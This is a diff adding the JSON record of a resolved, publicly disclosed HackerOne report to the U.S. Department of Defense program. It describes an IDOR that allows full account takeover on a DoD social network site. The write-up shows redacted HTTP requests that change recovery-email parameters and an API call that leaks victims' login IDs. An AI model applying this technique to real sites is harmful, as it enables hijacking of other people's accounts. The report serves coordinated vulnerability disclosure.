@@ -1,0 +1,109 @@
+{
+  "id": 847452,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NDc0NTI=",
+  "url": "https://hackerone.com/reports/847452",
+  "title": "Full Account Take-Over of ████████ Members via IDOR",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-11T16:43:50.478Z",
+  "submitted_at": "2020-04-11T16:43:50.478Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "r00tpgp",
+    "url": "/r00tpgp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/214/907/bbff1d78663047d6dfa3d2ef20d46ccccc96ae0c_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-05-14T18:08:23.515Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-04-22T00:23:20.206Z",
+  "team_member_agreed_on_going_public_at": "2020-05-14T18:08:23.432Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "##Summary\nhttps://███████ is a Social Network Site belonging to US DoD. Membership is open to anyone, I have found a method to fully take-over any members' account by exploiting an IDOR bug in the `██████████` end-point. By changing the following values in the `POST` request to the affected end-point:\n\n`userName`\n`originalEmail`\n`Email`\n`RecoveryEmail`\n\nI am able to add Recovery Email address of my choice, thus, enabling me to send a password reset link to my attacker controlled email address. I have uploaded a video PoC to demo my finding. Note that the following test accounts were used:\n\n###Attacker\nlogin: ████████\n\n###Victim\nlogin: ███████\n\nI added `████` email into the victim account. Note that this only works on victims that have no recovery email address defined or recovery email that are not yet verified. This technique will NOT work on victims' that already have a confirmed recovery email address.\n\nAlso note, that I am using multi-containers plugin for Firefox, therefore, each tab represents separate browser session. Finally, note that in my PoC video, I had to insert the victim recovery email link `████████/self?guid=█████████` into the attackers' session because a valid session is required to validate the email. The session does not necessary have to belong to the victims' session to validate.\n\nThe IDOR bug can be obtained by intercepting the 2-FA Authentication switch:\n\n███\n\n\n## Vulnerable End-Point\n\nHere is the vulnerable POST request when captured, the cookies and `__RequestVerificationToken` must be valid for this attack to work, I have ==highlighted== the vulnerable IDOR parameters:\n\nPOST /self HTTP/1.1\nHost: █████████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://███/self\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 739\nConnection: close\nCookie: ███████-Http-Session=███; _ga=█████; _gid=███; AWSALB=█████; AWSALBCORS=████; ASP.NET_SessionId=██████████; BIGipServer~Sync_Only~passport_pool=█████; akaalb_albcustom=█████████████def~id=██████████; AWSALB=███; AWSALBCORS=██████; googtrans=/en/en; googtrans=/en/en; UserName=███████████; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-███; _gat_███Tracker=1; __RequestVerificationToken_Lw__=█████\nUpgrade-Insecure-Requests: 1\n\n__RequestVerificationToken=█████████&==userName=████&originalEmail=████████%40gmail.com&oldPassword=&EmailSent=False&RecoveryEmailSent=true&RecoveryEmailVerified=true&SecurityImagePath=&Translate=en&COIGroupID=&Username=█████████&Email=██████████%40gmail.com&ConfirmEmail=&RecoveryEmail=██████████&ConfirmRecoveryEmail=&NewPassword=&ConfirmPassword=&TwoFactorAuthenticationEnabled=false&Password=&Password=&Password=&Password=&Password===\n\n## Impact\n\nAn attacker can add his email address into the recovery field of any █████████ member that has not yet defined or verified a Recovery Email address. He will then be able to force a password reset link to be sent to his email address and change the victims' password and login into victims' account. Attacker now has full control of victims' account.\n\nAlso, victim login id is easily retrievable from this end point. By running the `RequesteeId` using any valid user session, attacker is  able to retrieve the `ProfileUrl` containing the victims' login id.\n\n##Request\n\nPOST /api.ashx/v2/users/████/friends.json HTTP/1.1\nHost: █████████\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0\nAccept: application/json, text/javascript, /; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nAuthorization-Code: █████████\nRest-Authorization-Code: █████████\nX-Requested-With: XMLHttpRequest\nContent-Length: 35\nOrigin: https://████\nConnection: close\nReferer: https://████/members/███/\nCookie: _ga=███████; _gid=██████████; AWSALB=█████████; AWSALBCORS=█████; █████████-Http-Session=█████████; googtrans=/en/en; UserName=█████████,█████; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-████; akaalb_albcommunity=██████████; AuthorizationCookie=███; BIGipServer~Sync_Only~community_pool=██████████\n\n==RequesteeId=███████==&RequestMessage=+\n\n##Reply:\n\n\n{\n\"Friendship\": {\n\"CreatedDate\": \"2020-04-11T08:22:53.247\",\n\"FriendshipState\": \"Pending\",\n\"LastModifiedDate\": \"2020-04-11T08:22:53.247\",\n\"RequestMessage\": \" \",\n\"RequestorId\": ██████,\n==\"RequesteeId\": █████,==\n\"User\": {\n\"AvatarUrl\": \"https://████████/cfs-file/__key/system/images/anonymous.gif\",\n\"DisplayName\": \"█████\",\n==\"ProfileUrl\": \"https://████/members/███████\",==\n\"Username\": \"██████████\",\n\"CurrentStatus\": null,\n\"Id\": █████████\n},\n\"Id\": ███\n},\n\"Info\": [],\n\"Warnings\": [],\n\"Errors\": []\n}\n\n\nTherefore, attacker just needs to feed the login id into the vulnerable end-point and follow the steps outlined in the PoC video to take over thousands of ██████████ user accounts!",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 6,
+  "voters": [
+    "daehee",
+    "s_b5i57",
+    "rrivera",
+    "modrnproph3t",
+    "tajy",
+    "r00talpha"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
